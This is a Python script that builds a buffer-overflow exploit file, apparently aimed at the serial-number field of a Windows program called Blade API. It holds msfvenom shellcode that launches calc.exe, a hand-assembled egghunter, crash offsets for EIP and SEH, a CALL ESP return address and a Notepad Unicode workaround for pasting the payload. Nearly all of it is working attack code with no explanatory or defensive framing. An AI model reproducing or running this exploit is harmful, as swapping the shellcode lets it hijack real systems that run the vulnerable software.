import sys, struct

filename = "sploit_blade_api.txt"

# msfvenom -p windows/exec cmd=calc.exe -v shellcode -f python -b '\x00\x0a\x0d' exitfunc=thread
# Size 220 bytes
shellcode =  ""
shellcode += "\xda\xd6\xd9\x74\x24\xf4\xbf\xf7\xab\x38\x5f\x5d"
shellcode += "\x2b\xc9\xb1\x31\x31\x7d\x18\x03\x7d\x18\x83\xed"
shellcode += "\x0b\x49\xcd\xa3\x1b\x0c\x2e\x5c\xdb\x71\xa6\xb9"
shellcode += "\xea\xb1\xdc\xca\x5c\x02\x96\x9f\x50\xe9\xfa\x0b"
shellcode += "\xe3\x9f\xd2\x3c\x44\x15\x05\x72\x55\x06\x75\x15"
shellcode += "\xd5\x55\xaa\xf5\xe4\x95\xbf\xf4\x21\xcb\x32\xa4"
shellcode += "\xfa\x87\xe1\x59\x8f\xd2\x39\xd1\xc3\xf3\x39\x06"
shellcode += "\x93\xf2\x68\x99\xa8\xac\xaa\x1b\x7d\xc5\xe2\x03"
shellcode += "\x62\xe0\xbd\xb8\x50\x9e\x3f\x69\xa9\x5f\x93\x54"
shellcode += "\x06\x92\xed\x91\xa0\x4d\x98\xeb\xd3\xf0\x9b\x2f"
shellcode += "\xae\x2e\x29\xb4\x08\xa4\x89\x10\xa9\x69\x4f\xd2"
shellcode += "\xa5\xc6\x1b\xbc\xa9\xd9\xc8\xb6\xd5\x52\xef\x18"
shellcode += "\x5c\x20\xd4\xbc\x05\xf2\x75\xe4\xe3\x55\x89\xf6"
shellcode += "\x4c\x09\x2f\x7c\x60\x5e\x42\xdf\xee\xa1\xd0\x65"
shellcode += "\x5c\xa1\xea\x65\xf0\xca\xdb\xee\x9f\x8d\xe3\x24"
shellcode += "\xe4\x72\x06\xed\x10\x1b\x9f\x64\x99\x46\x20\x53"
shellcode += "\xdd\x7e\xa3\x56\x9d\x84\xbb\x12\x98\xc1\x7b\xce"
shellcode += "\xd0\x5a\xee\xf0\x47\x5a\x3b\x93\x06\xc8\xa7\x7a"
shellcode += "\xad\x68\x4d\x83"

# Egghunter ODOR
egghunt = (
            "\x66\x81\xCA\xFF\x0F"      # or dx,0xfff
            "\x42"                      # inc edx
            "\x52"                      # push edx
            "\x6A\x02"                  #  push byte
            "\x58"                      # pop eax
            "\xCD\x2E"                  # int 0x2e
            "\x3C\x05"                  # cmp al,0x5
            "\x5A"                      # pop edx
            "\x74\xEF"                  # jz 0x0
            "\xB8\x52\x4F\x44\x4F"      # mov eax,0x524F444F        # Tag "ODOR"
            "\x8B\xFA"                  # mov edi,edx
            "\xAF"                      # scasd
            "\x75\xEA"                  # jnz 0x5
            "\xAF"                      # scasd
            "\x75\xE7"                  # jnz 0x5
            "\xFF\xE7"                  # jmp edi
)

# Eggstring
egg = "ODOR"[::-1] * 2

# Lengths
maxlen = 5000

# Offsets
crash_ecx = 544
crash_ebx = 494
crash_ebp = 556
crash_eip = 560
crash_seh = 564

# NOP's
nop = "\x90" * 16

# Notepad Unicode bug: translates characters differently to be able to copy/pase in SN field
notebug = (
                "\xB8\x06\xAA\x6F\x50"
                "\x6F\x4C\x6F\x58\x6F"
                "\x05\x73\x00\x6F\xB0"
                "\xB9\xD8\xAA\x6F\xE8"
)

# Crafting variables
prefix = notebug
prefix += "A" * crash_eip
eip = struct.pack("<L", 0x0041da65)                     # CALL ESP
suffix = nop
suffix += egghunt
suffix += nop
suffix += egg
suffix += shellcode
suffix += "B" * (maxlen - len(prefix + eip + suffix))

# Constructing payload
payload = prefix + eip + suffix

f = open(filename, 'wb')
f.write(payload)
f.close()
